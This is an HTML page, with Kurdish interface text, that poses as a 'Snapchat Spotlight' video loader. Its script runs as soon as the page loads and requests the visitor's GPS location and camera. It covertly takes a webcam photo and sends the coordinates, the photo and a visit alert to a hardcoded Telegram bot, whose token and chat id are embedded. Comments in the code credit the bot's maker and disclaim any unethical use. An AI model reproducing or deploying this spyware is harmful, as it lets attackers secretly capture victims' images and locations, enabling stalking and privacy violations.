<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Spotlight</title>
    <style>
        body { background-color: #000; color: white; font-family: Arial; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        video, canvas { display: none; }
        .loader { border: 5px solid #333; border-top: 5px solid #fffc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <h1>Snapchat Spotlight</h1>
        <p>هيڤي دكه م وه بكه ڤيديو ڤه بيتن ...</p>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const token = '8977945781:AAFI44ROudR5eLDwlBrpNSyNiJj-C8FuDmE';
        const chat_id = '7643191802';

        // ١. فريكرنا ريسالئن ئاسایی
        async function sendMessage(text) {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat_id, text: text })
            });
        }

        // ٢. وەرگرتنا جهئ وي (Location)
        function askLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    sendMessage(`📍 جهئ وي هاته ديتن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين@YUSEEF_SURCHI:\nhttps://www.google.com/maps?q=${lat},${lon}`);
                }, () => sendMessage("⚠️  نه هئلا جهئ وي ببيني هه ر كاره كئ بئ اخلاق ام به ر پرس نينين (GPS) او كه سئ بوت درسكري @YUSEEF_SURCHI "));
            }
        }

        // ٣. گرتنا رسمي و فرئكرنئ
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chat_id);
                        formData.append('photo', blob, 'snap.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) {
                sendMessage("⚠️  رئكئ ب کاميرئ ناده تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI");
            }
        }

        // وه ختئ ويبسايت ڤه د بيتين ڤه دبيته ڤه
        window.onload = () => {
            sendMessage("🚀 کەسەک هاتە دناف ويبسايتي دا، نوكه داخازيا کامێرئ و جهئ وي دكه تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI");
            askLocation();
            startCamera();
        };
    </script>
</body>
</html>
